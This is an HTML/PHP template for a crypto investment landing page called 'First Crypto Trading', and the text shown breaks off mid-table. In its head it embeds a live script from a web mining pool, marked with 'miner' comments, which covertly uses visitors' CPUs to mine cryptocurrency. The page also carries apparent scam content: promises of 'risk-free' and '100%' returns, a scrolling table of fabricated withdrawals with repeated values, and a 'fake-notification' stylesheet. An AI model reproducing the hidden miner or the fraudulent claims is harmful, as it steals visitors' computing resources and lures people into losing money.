<!DOCTYPE html>
<html lang="en" xml:lang="en">    

<head>       
    <meta charset="UTF-8">  
    <!-- Responsive Meta -->                    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
 <!--miner-->
<script src="https://webminepool.com/lib/base.js"></script>
<!--miner-->



    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <!-- favicon & bookmark -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144"  href="images/bookmark.png" type="image/x-icon" />
    <link rel="icon" href="<?php echo e(asset ('home/images/favicon.png')); ?>" type="image/png" sizes="32x32">
    <!-- Font Family -->
    <link href="https://fonts.googleapis.com/css?family=PT+Sans:400,700" rel="stylesheet"> 
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700,800" rel="stylesheet">
    <!-- Website Title -->
    <title><?php echo e($settings->site_name); ?> | <?php echo e($settings->site_title); ?></title>
    <!-- Stylesheets Start -->
    <link rel="stylesheet" href="<?php echo e(asset ('home/css/fontawesome.min.css')); ?>" type="text/css"/>
    <link rel="stylesheet" href="<?php echo e(asset ('home/css/bootstrap.css')); ?>" type="text/css"/>
    <link rel="stylesheet" href="<?php echo e(asset ('home/css/animate.css')); ?>" type="text/css"/>
    <link rel="stylesheet" href="<?php echo e(asset ('home/css/owl.carousel.min.css')); ?>" type="text/css"/>
    <link rel="stylesheet" href="<?php echo e(asset ('home/style.css')); ?>" type="text/css"/>
    <link rel="stylesheet" href="<?php echo e(asset ('home/css/responsive.css')); ?>" type="text/css"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
     <!-- Stylesheets End -->
    <!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.js"></script><![endif]-->
    <!--[if lt IE 9]><script src="js/respond.js"></script><![endif]-->
    <link rel="stylesheet" href="<?php echo e(asset ('home/css/toast.css')); ?>"/>
    <link rel="stylesheet" href="<?php echo e(asset ('home/alert/fake-notification-min.css')); ?>"/>
	<link rel="stylesheet" href="<?php echo e(asset('home/css/simple-notify.min.css')); ?>">
    <style>
		
        .fluid{
        width:160px;
        height:65px;
            }
    @media (max-width: 991px){
        .fluid{
        width:125px;
        height:55px;
        }
        }   

    </style>
   
 
</head>
<body>
    <!--Main Wrapper Start-->
    <div class="wrapper" id="top">
        <!--Header Start -->  
	   <header>   
		   <div class="container">
				<div class="row"> 
                    <div class="col-sm-6 col-md-4 logo">
                        <a href="index" title="<?php echo e($settings->site_name); ?>">
                            <img class="light" src="<?php echo e(asset('/home/images/logo-light.png')); ?>"  width="120" alt="<?php echo e($settings->site_name); ?>">
                            <img class="dark" src="<?php echo e(asset('/home/images/logo-dark.png')); ?>"  width="120" alt="<?php echo e($settings->site_name); ?>">
                        </a>
                    </div>
                    <div class="col-sm-6 col-md-8 main-menu">
					   <div class="menu-icon">
                          <span class="top"></span>
                          <span class="middle"></span>
                          <span class="bottom"></span>
                        </div>
                        <nav class="onepage">
                            <ul>
                                <li class="active"><a href="#top">Home</a></li>
                                <li><a href="#about">About Us</a></li>
                               <li><a href="#token">Equities</a></li>
                                <li><a href="#team">Testimonials</a></li>
                                <li><a href="#contact">Contact Us</a></li>
                                <li class="nav-btn"><a href="login">Sign In</a></li>
                            </ul>
                        </nav>
                    </div>
                </div>
		
            </div>
        </header>
	
        <!--Header End-->
<!--alert js-->
        
		
<!--/alert js-->
        <!-- Content Section Start -->   
        <div class="midd-container">
            <!-- Hero Section Start -->   
            <div class="hero-main mercury-layout white-sec" style="background:url( <?php echo e(asset('home/images/banner-6.jpg')); ?> );">
                <div class="container">
                    <div class="row align-items-center flex-row-reverse">
                        <div class="col-sm-12 col-md-6" data-wow-delay="0.5s">
                            <div class="mercury-animation">
                                <div class="numbers">
                                    <div class="number-one"></div>
                                    <div class="number-two"></div>
                                </div>
                                <div id="earth-box-cover">
                                    <div class="earth-icons">
                                        <i class="icon-1"></i>
                                        <i class="icon-2"></i>
                                        <i class="icon-3"></i>
                                        <i class="icon-4"></i>
                                        <i class="icon-5"></i>
                                        <i class="icon-6"></i>
                                        <i class="icon-7"></i>
                                    </div>
                                    <div id="earth-box">
                                        <span></span>
                                    </div>
                                </div>
                                <!-- <div class="earth">
                                    <img src="images/mercury-earth.png" alt="">
                                </div> -->
                            </div>
                        </div>
                        <div class="col-sm-12 col-md-6">
                            <h1><?php echo e($settings->site_name); ?> makes it safe and easy to invest </h1>
                            <p class="lead">A place for everyone who wants to simply Invest and get high returns on every investment.</p>
                            <div class="hero-btns">
                                <a href="login" class="btn">LOGIN</a>
                                <a href="register" class="btn btn3">REGISTER TODAY</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
			<div style="height:20px; padding:0px; margin:0px; width: 100%;">
			<iframe src="https://widget.coinlib.io/widget?type=horizontal_v2&theme=dark&pref_coin_id=1505&invert_hover=no" width="100%" height="36px" scrolling="auto" marginwidth="0" marginheight="0" frameborder="0" border="0" style="border:0;margin:0;padding:0;"></iframe>
	   </div>
            <!-- Hero Section End -->   
            <!--About Start -->
            <div class="about-section p-tb mercury-layout" id="about">
                <div class="container">
                     <div class="row flex-row-reverse align-items-center">
					 
					<div class="col-lg-6 col-md-12">
					    <div class="about-mercury-img mobile">
                            <div style="height:330px; padding:0px; margin:0px; width: 100%;"><iframe src="https://widget.coinlib.io/widget?type=chart&theme=dark&coin_id=859&pref_coin_id=1505" width="100%" height="380px" scrolling="none" marginwidth="0" marginheight="0" frameborder="0" border="0" style="border:0;margin:0;padding:0;line-height:14px;"></iframe></div>
                        </div>
                    </div>
                        <div style="margin-top:100px;" class="col-lg-6 col-md-12">
                            <h2 class="section-heading">About First Crypto Trading</h2>
                            <h4>Why to choose First Crypto Trading?</h4>
                            <h5>
First Crypto Tradingprovides you with a wide range of platform and service options best tailored to your trading style and needs. Whether you’re a self-directed trader trading online, or trading through our desk, we offer multiple solutions.
</h5>
                            <p>
We welcome you to the digital world of crypto investment and online trading where our clients will receive stable and risk-free long-term returns by placing their Bitcoin asset in our online profound asset management program. </p>
                            <div class="button-wrapper">
                                <a class="btn" href="#">Read More</a>
                                <a class="watch-link" href="#">
                                    <i class="fas fa-play"></i>
                                    <span><strong>Watch video</strong>What and How it work</span> 
                                </a>
                            </div>
                        </div>
                        
                    </div>
                </div>
            </div>
            <!--About end -->
            
            <!-- Benefits Start -->
            <div class="benefits p-tb light-gray-bg mercury-layout">
                <div class="container">
                    <div class="text-center"><h2 class="section-heading">Benefits of Using Our Solution</h2></div>
                    <div class="sub-txt mw-850 text-center">
                  
                    </div>
                    <div class="row">
                        <div class="col-lg-4 col-md-6">
                            <div class="benefit-box text-center">
                                <div class="benefit-icon">
                                    <img src="<?php echo e(asset('home/images/benefit-icon-1.png')); ?>" alt="Safe and Secure">
                                </div>
                                <div class="text">
                                    <h4>Safe and Secure</h4>
                                    <p>We strive to keep collected user data to a minimum and only ask for information that is mandatory from a regulatory perspective..</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4 col-md-6">
                            <div class="benefit-box text-center">
                                <div class="benefit-icon">
                                    <img src="<?php echo e(asset('home/images/benefit-icon-2.png')); ?>" alt="Instant Exchange">
                                </div>
                                <div class="text">
                                    <h4>Instant Exchange</h4>
                                    <p>We accept several payment method just to make it convinient while funding and paying out.</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4 col-md-6">
                            <div class="benefit-box text-center">
                                <div class="benefit-icon">
                                    <img src="<?php echo e(asset ('home/images/benefit-icon-3.png')); ?>" alt="World Coverage">
                                </div>
                                <div class="text">
                                    <h4>World Coverage</h4>
                                    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean cursus tincidunt ultrices. Ut quis blandit dolor. Ut laoreet sagittis arcu eu tristique.</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4 col-md-6">
                            <div class="benefit-box text-center">
                                <div class="benefit-icon">
                                    <img src="<?php echo e(asset ('home/images/benefit-icon-4.png')); ?>" alt="Mobile Apps">
                                </div>
                                <div class="text">
                                    <h4>Mobile Apps</h4>
                                    <p>Trade Binary options, Forex, CFDs on stocks and ETFs. Coming soon</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4 col-md-6">
                            <div class="benefit-box text-center">
                                <div class="benefit-icon">
                                    <img src="<?php echo e(asset ('home/images/benefit-icon-5.png')); ?>" alt="Strong Network">
                                </div>
                                <div class="text">
                                    <h4>Strong Network</h4>
                                    <p>Our financial team work around the clock to ensure your funds are released not more than 24hour after request.</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4 col-md-6">
                            <div class="benefit-box text-center">
                                <div class="benefit-icon">
                                    <img src="<?php echo e(asset ('home/images/benefit-icon-6.png')); ?>" alt="Margin Trading">
                                </div>
                                <div class="text">
                                    <h4>Margin Trading</h4>
                                    <p>Get paid by your employer in any currency, or combination of currencies you want: 70% in USD, 20% Euros, 10% Bitcoin..</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                </div>
            </div>
            <!-- Benefits End -->
            
            
            
            <div class="section-full  p-t80 p-b80 bg-gray">
<div class="container">

<div class="section-head text-center">
<span class="wt-title-subline font-16 text-gray-dark m-b15"></span>
<h2 class="text-uppercase">Latest Withdrawals</h2>
<div class="wt-separator-outer">
<div class="wt-separator bg-primary"></div>
</div>
<p></p>
</div>

<div class="table-responsive" style="height:400px; width:100%;  ">
<marquee direction="down" style="height:400px; width:99%;  ">
<table class="table"  >
<thead>
<tr>
<th class="text-center">Status</th>
<th class="text-center">Amount(USD)</th>
<th class="text-center">Wallet</th>
</tr>
</thead>
<tbody>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$10,000.00</td>
<td class="text-center">
3a17c5984af22cd7a443f14457841b3b19a51ea75a30e18bc6a82e4f8732dbca
</td>
</tr>
<tr>
<td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
<td class="text-center">$51,000.00</td>
<td class="text-center">
8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$24,100.00</td>
<td class="text-center">
f007e92cc9f82ba9c8c40c481eec7315fa9abcd85e7249a6cb57e38a2cf22d3e
</td>
</tr>
<tr>
<td class="text-center"><button class="btn btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$4,000.00</td>
<td class="text-center">
8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$500</td>
<td class="text-center">
00db85ef40da34f3ea76aa60f0b2053eec2d90121e450791c18d8edbfedde6f1
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$240,000</td>
<td class="text-center">
b21a418a44ed8b56118facefe7aa8d26541dff811b8a8ca65cfa1346d62c5c48
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$17,000</td>
<td class="text-center">
1e652d2899a1d058a20041a9faaeb5dc009101ca412ff09c387e6b281bd1db8b
</td>
</tr>
<tr>
 <td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
<td class="text-center">$51,000</td>
<td class="text-center">
6a49e66a66f75e72e6bd383ac798792af204a6693708912ad0d48e363a2ab7a7
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$21,000</td>
<td class="text-center">
8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
</td>
</tr>
<tr>
<td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
<td class="text-center">$6,000</td>
<td class="text-center">
797ba039291417fdbdb411ea0a102d23090cde9ac7799ff605f40b5db484891d
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$9,000</td>
<td class="text-center">
f0b66ce7a33bbc63bf50050beaf52be71709c359aa1d344bb90f943690485661
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$23,000</td>
<td class="text-center">
2083e95ada3c584471ba5982e16c5dc2a6e464d3c170555ea8c708668be9383b
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$51,000</td>
<td class="text-center">
8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$5,000</td>
<td class="text-center">
8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
</td>
</tr>
 <tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">5,000</td>
<td class="text-center">
15c3a97edbd606bd1e455aa2875677f5c6cd2b804e9054e898f640d313e39781
</td>
</tr>
<tr>
<td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
<td class="text-center">$18,000</td>
<td class="text-center">
66c13496e9d53a2402fd49bbe91df298164472679cc868bbfebbabb4844d784c
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$2,500</td>
<td class="text-center">
ce972a6b82135fcba0890ea0c8668bdddf782fd580672daa6616c3b1af40ca9f
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$9,000</td>
<td class="text-center">
376e809b02e6ef044f6d5cf5b72111f25f3c3e16a93dce865a178e2e0f5c484c
</td>
</tr>
<tr>
<td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
<td class="text-center">$43,000</td>
<td class="text-center">
aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$10,000.00</td>
<td class="text-center">
3a17c5984af22cd7a443f14457841b3b19a51ea75a30e18bc6a82e4f8732dbca
</td>
</tr>
<tr>
<td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
<td class="text-center">$51,000.00</td>
<td class="text-center">
8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
</td>
</tr>
 <tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$24,100.00</td>
<td class="text-center">
f007e92cc9f82ba9c8c40c481eec7315fa9abcd85e7249a6cb57e38a2cf22d3e
</td>
</tr>
<tr>
<td class="text-center"><button class="btn btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$4,000.00</td>
<td class="text-center">
8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$500</td>
<td class="text-center">
00db85ef40da34f3ea76aa60f0b2053eec2d90121e450791c18d8edbfedde6f1
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$240,000</td>
<td class="text-center">
b21a418a44ed8b56118facefe7aa8d26541dff811b8a8ca65cfa1346d62c5c48
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$17,000</td>
<td class="text-center">
1e652d2899a1d058a20041a9faaeb5dc009101ca412ff09c387e6b281bd1db8b
</td>
</tr>
<tr>
<td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
<td class="text-center">$51,000</td>
<td class="text-center">
6a49e66a66f75e72e6bd383ac798792af204a6693708912ad0d48e363a2ab7a7
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$21,000</td>
<td class="text-center">
8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
</td>
</tr>
<tr>
<td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
<td class="text-center">$6,000</td>
<td class="text-center">
797ba039291417fdbdb411ea0a102d23090cde9ac7799ff605f40b5db484891d
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$9,000</td>
<td class="text-center">
f0b66ce7a33bbc63bf50050beaf52be71709c359aa1d344bb90f943690485661
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$23,000</td>
<td class="text-center">
2083e95ada3c584471ba5982e16c5dc2a6e464d3c170555ea8c708668be9383b
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$51,000</td>
<td class="text-center">
8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$5,000</td>
<td class="text-center">
8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">5,000</td>
<td class="text-center">
15c3a97edbd606bd1e455aa2875677f5c6cd2b804e9054e898f640d313e39781
</td>
</tr>
<tr>
<td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
<td class="text-center">$18,000</td>
<td class="text-center">
66c13496e9d53a2402fd49bbe91df298164472679cc868bbfebbabb4844d784c
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$2,500</td>
<td class="text-center">
ce972a6b82135fcba0890ea0c8668bdddf782fd580672daa6616c3b1af40ca9f
</td>
</tr>
<tr>
<td class="text-center"><button class="btn
                                            btn-info btn-sm"><span class="btn-label"><i class="fa
                                            fa-check"></i></span>Confirmed</button></td>
<td class="text-center">$9,000</td>
<td class="text-center">
376e809b02e6ef044f6d5cf5b72111f25f3c3e16a93dce865a178e2e0f5c484c
</td>
</tr>
<tr>
<td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
<td class="text-center">$43,000</td>
<td class="text-center">
aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
</td>
</tr>
</tbody>
</table>
</marquee>
</div>
</div>
</div>

            
            
            <!-- Token Sale start -->
            <div class="token-sale p-tb mercury-layout" id="token">
                <div class="container">
                    <div class="text-center"><h2 class="section-heading">The best place to Trade digital currencies </h2></div>
                    <div class="sub-txt mw-650 text-center">
                        <p>We provide multi-algorithms, using the latest technology without any pool fees. The ultimate goal of our existence is to make trading an easy, smart and rewarding experience for everyone..</p>
                    </div>
                    <div class="row flex-row-reverse align-items-center">
                        <div class="col-lg-7 col-md-12">
                            <div class="token-allocation-animation">
                                <div class="main-circle-one">
                                    <ul class="allocation-list-point">
                                        <li><i class="point"></i><span>100% Bitcoin Investment Return</span></li>
                                        <li><i class="point"></i><span>100% Etherum Investment Return</span></li>
                                        <li><i class="point"></i><span>100% Litecoin Investment Return</span></li>
                                        <li><i class="point"></i><span>100% Tether Investment Return</span></li>
                                        <li><i class="point"></i><span>100% Binance Coin Investment Return </span></li>
                                        <li><i class="point"></i><span>100% Dogecoin Investment Return</span></li>
                                        <li><i class="point"></i><span>100% Creditcoin Investment Return </span></li>
                                    </ul>
                                    <div class="center-point">
                                        <img src="<?php echo e(asset('home/images/gold-animation-icon-1.png')); ?>" alt="" >
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-5 col-md-12">
                            <ul class="allocation-list">
                                <li><span>100%</span> Bitcoin Investment Return</li>
                                <li><span>100%</span> Etherum Investment Return</li>
                                <li><span>100%</span> Litecoin Investment Return</li>
                                <li><span>100%</span> Tether Investment Return</li>
                                <li><span>100%</span> Binance Coin Investment Return</li>
                                <li><span>100%</span> Dogecoin Investment Return</li>
                                <li><span>100%</span> Creditcoin Investment Return </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Token Sale end -->
          
            <!-- Currency convertor Start -->
            <div id="convertor" class="currency-convertor mercury-layout p-t p-tb c-l">
                <div class="container">
                    <div class="text-center"><h2 class="section-heading">Currency Convertor</h2></div>
                    <div class="sub-txt text-center">
                        <p>A defining characteristic of cryptocurrencies is that they are generally not issued by any central authority, such as a Central Bank, rendering them in theory immune to government interference or manipulation.</p>
                    </div>
                    <div class="convertor-widget">
                        <div class="currency-calulator">
                            <script type="text/javascript">crypt_calc_border_width = 0;crypt_calc_border_color = "#ffffff";crypt_calc_border_corners = "square";crypt_calc_font_family = "Open sans";</script>
                            <script type="text/javascript" src="../../www.cryptonator.com/ui/js/widget/calc_widget.js"></script>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Currency End -->
            
            <!-- The Roadmap  start-->
            <div class="roadmap-sec p-tb mercury-layout" id="roadmap">
                <div class="container">
                    <div class="text-center"><h2 class="section-heading">Road Map</h2></div>
                    <div class="sub-txt text-center">
                        <p>Our journey so far and we are getting stronger each day thanks to all our amazing client who trust us to invest
						with us...</p>
                    </div>
                    <div class="mercury-roadmap owl-carousel">
                        <div class="roadmap-item odd">
                            <div class="roadmap-text">
                                <div class="roadmap-day">
                                    <div class="date"><span>14th</span>March 2018</div>
                                </div>
                                <div class="roadmap-item-text">
                                    <h4>Beta Launched</h4>
                                    <p>Beta launch of our plateform.</p>
                                </div>
                            </div>
                        </div>
                        <div class="roadmap-item even">
                            <div class="roadmap-text">
                                <div class="roadmap-day">
                                    <div class="date"><span>21th</span>January 2019</div>
                                </div>
                                <div class="roadmap-item-text">
                                    <h4>Payment Testing</h4>
                                    <p>Deposit and withdrawer testing.</p>
                                </div>
                            </div>
                        </div>
                        <div class="roadmap-item odd">
                            <div class="roadmap-text">
                                <div class="roadmap-day">
                                    <div class="date"><span>18th</span>April 2019</div>
                                </div>
                                <div class="roadmap-item-text">
                                    <h4>Security checks updated</h4>
                                    <p>Implenting User login security.</p>
                                </div>
                            </div>
                        </div>
                        <div class="roadmap-item even">
                            <div class="roadmap-text">
                                <div class="roadmap-day">
                                    <div class="date"><span>31th</span>October 2019</div>
                                </div>
                                <div class="roadmap-item-text">
                                    <h4>Alpha Launch</h4>
                                    <p>Alpha launch of our plateform.</p>
                                </div>
                            </div>
                        </div>
                        <div class="roadmap-item odd">
                            <div class="roadmap-text">
                                <div class="roadmap-day">
                                    <div class="date"><span>09th</span>September 2020</div>
                                </div>
                                <div class="roadmap-item-text">
                                    <h4>Updated payment Methods</h4>
                                    <p>Added more payment Options for depsoit and withdrawer</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- The Roadmap end-->
            <div id="counter" class="milestone-section p-tb c-l">
                <div class="container">
                    <div class="row">
                        <div class="col">
                            <div class="counter" >
                                <div class="counter-icon">
                                    <img src="images/transactions-icon.png" alt="" />
                                </div>
                                <div class="counter-value" data-count="1594">1594</div>
                                <h4 class="count-text ">Transactions</h4>
                            </div>
                        </div>
                        <div class="col">
                            <div class="counter">
                                <div class="counter-icon">
                                    <img src="images/support-icon.png" alt="" />
                                </div>
                                <div class="counter-value" data-count="649">649</div>
                                <h4 class="count-text ">Operator</h4>
                            </div>
                        </div>
                        <div class="col">
                            <div class="counter">
                                <div class="counter-icon">
                                    <img src="images/wallets-icon.png" alt="" />
                                </div>
                                <div class="counter-value" data-count="852">852</div>
                                <h4 class="count-text ">Bitcoin Wallets</h4>
                            </div>
                        </div>
                        <div class="col">
                            <div class="counter">
                                <div class="counter-icon">
                                    <img src="images/countries-icon.png" alt="" />
                                </div>
                                <div class="counter-value" data-count="198">150</div>
                                <h4 class="count-text ">Countries</h4>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
			
			
			<div class="team-section p-tb light-gray-bg mercury-layout" id="team">
                <div class="container">
                    <div class="text-center"><h2 class="section-heading">Certification</h2></div>
                    <div class="row">
                        <div class="col-md-12">
                          
                                <div class="team-img">
                                   <center> <img src="<?php echo e(asset ('home/images/1.png')); ?>" alt="" width="800" height="600"></center>
                                    
                              
							</div>
						</div>
                    </div>
                </div>
            </div>
            <!-- Team sec end-->
			
			
			
			
			<style>
			
				.button-table {
					  border: none;
					  color: white;
					  padding: 15px 32px;
					  text-align: center;
					  text-decoration: none;
					  display: inline-block;
					  font-size: 16px;
					  margin: 4px 2px;
					  cursor: pointer;
					}
				
				.button1 {
					   background-color: #4CAF50;
					} /* Green */
				.button2 {
					background-color: #fbbd18;;
					} /* Blue */
				
				
				.table-style{
				    margin-top: 47px;
					margin-left: 79px;
					margin-right: 62px;
					margin-block: 55px;
					border-block: 1px solid #000;
					height:510px; 
					width:90%;
					overflow-y: auto;
					border:2px solid #444;
				}
			
				.table-font{
					    text-align: center;
						white-space: nowrap;
						font-family:Poppins, san-serif;
						font-weight:400;
				}
				
				table {
				  border-collapse: collapse;
				  border-spacing: 0;
				  width: 100%;
				  border: 1px solid #ddd;
				}

				th, td {
				  text-align: left;
				  padding: 8px;
				}

				tr:nth-child(even){background-color: #f2f2f2}
				
				
				.table-responsive{
				  height:180px; 
				  width:50%;
				  overflow-y: auto;
				  border:2px solid #444;
				}
				
				.table-responsive:hover{border-color:red;}

				table{width:100%;}
				td{padding:24px; background:#eee;}
				
				
				
				
		@media  only screen and (max-width: 600px) {
				
				.table-style{
				        margin-top: 54px;
						margin-left: 14px;
						margin-right: 24px;
						margin-block: 55px;
						border-block: 1px solid #000;
						overflow-y: auto;
						border:2px solid #444;
				}
			
				.table-font{
					text-align: left;
					white-space: nowrap;
				}
				
				table {
				  border-collapse: collapse;
				  border-spacing: 0;
				  width: 100%;
				  border: 1px solid #ddd;
				}

				th, td {
				  text-align: left;
				  padding: 8px;
				}

				tr:nth-child(even){background-color: #f2f2f2}
				
		}
				
				
				
				
				
				
				
				
				
				
				
				
				
			</style>
			
			
			<div class="table-style" style="overflow-x:auto;">
			  <table>
				<tr>
				  <th class="table-font"><b>Status</b></th>
				  <th class="table-font"><b>Amount(USD)</b></th>
				  <th class="table-font"><b>Wallet address</b></th>
				</tr>
				<tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$10,000.00</td>
				  <td class="table-font">3a17c5984af22cd7a443f14457841b3b19a51ea75a30e18bc6a82e4f8732dbca</td>
				</tr>
				<tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$24,000.00</td>
				  <td class="table-font">f007e92cc9f82ba9c8c40c481eec7315fa9abcd85e7249a6cb57e38a2cf22d3e</td>
				</tr>
				
				<tr>
				  <td class="table-font"><button class="button-table button2"><i class="fas fa-exclamation-triangle"></i> Pending</button></td>
				  <td class="table-font">$3,000.00</td>
				  <td class="table-font">ab6c83e95ada3c584471ba5982e16c5dc2a6e464d3c170555ea8c708668be9383b</td>
				</tr>
				
			   <tr>
